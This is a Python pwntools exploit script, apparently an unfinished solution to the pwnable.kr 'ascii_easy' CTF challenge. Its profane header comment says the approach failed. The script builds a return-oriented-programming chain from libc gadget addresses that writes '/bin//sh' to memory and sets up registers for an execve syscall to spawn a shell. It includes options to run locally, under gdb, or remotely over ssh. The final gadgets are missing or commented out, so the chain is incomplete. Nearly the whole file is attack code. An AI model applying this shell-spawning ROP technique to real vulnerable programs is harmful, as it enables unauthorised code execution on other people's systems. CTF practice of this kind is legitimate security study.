# THIS IS MY SOLUTION BEFORE I REALIZED THERE ARE NO FUCKING POP EAX GADGETS. I WANNA DIE


from pwn import *
import sys
import time

from pwnlib.libcdb import provider_local_system

# last resort 0x55577e45
context.arch="amd64"
context.kernel="amd64"
context.os="linux"


binary_name = "ascii_easy"
e  = ELF(binary_name, checksec=True)
rop = ROP(binary_name)
libc=ELF("./libc-2.15.so")
context.binary = e



def main():
    libc.address = 0x5555e000

    padding = b"A" *32
    ret = p32(0x555f3559)
    pop_ebx = p32(0x555f2c46)
    pop_eax= p32(0x556d7a33)
    pop_edi=p32(0x555f3558)
    mov_edi_pad_0x4c= p32(0x55613f73) 
    xor_eax_pop_edi=p32(0x556a5642)
    data_section = 0x55702057
    inc_eax =p32(0x556c6864) # this has a ret 0 after it, weirdly.
    pad_mov =(b"A" *0x4c )+ (p32(0x41414141)*4) # ebx esi edi ebp are popped.
    pop_ecx_eax_0xA= p32(0x556d2a51)
    pop_edx =p32(0x5565a1cb)
    read_func = p32(0x5563cbea)
    int_80 = p32(0x55667176)


    payload =  padding 
    payload+=ret
    payload+= pop_edi
    payload+=p32(data_section)
    payload+=read_func
    payload+=b"/bin"
    payload+=mov_edi_pad_0x4c
    payload+=pad_mov
    payload+=pop_edi
    payload+=p32(data_section+4)
    payload+=read_func
    payload+=b"//sh"
    payload+=mov_edi_pad_0x4c
    payload+=pad_mov

    log.success(f"Stored /bin/sh at {data_section}")

    payload+=xor_eax_pop_edi
    payload+=p32(data_section+8)
    payload+=mov_edi_pad_0x4c
    payload+=pad_mov
    payload+=pop_ebx
    payload+=p32(data_section)
    payload+=pop_ecx_eax_0xA
    payload+=p32(data_section+8)
    # payload+=pop_edx
    # payload+=p32(data_section+8)
    # payload+=inc_eax # EAX is already 0xA before this



    log.success(f"Constructed payload: {payload}")
    my_argv = [payload]
    args = [f"./{binary_name}"] + my_argv
    if(len(sys.argv) <2):
        print("Running locally")
        p = process(f"./{binary_name}")
    else:
        if(sys.argv[1] == "remote"):
            # or if using ssh:
            s = ssh(user='',host='pwnable.kr',port=2222,password='guest') 
            p= s.process(f"./{binary_name}",argv=my_argv) 
        elif(sys.argv[1] == "gdb"):
            p = gdb.debug(['./ascii_easy', payload.decode('ascii')], gdbscript="hb *0x555f3558", aslr=False)
        else:
            p = process(f"./{binary_name}",argv=my_argv)

main()
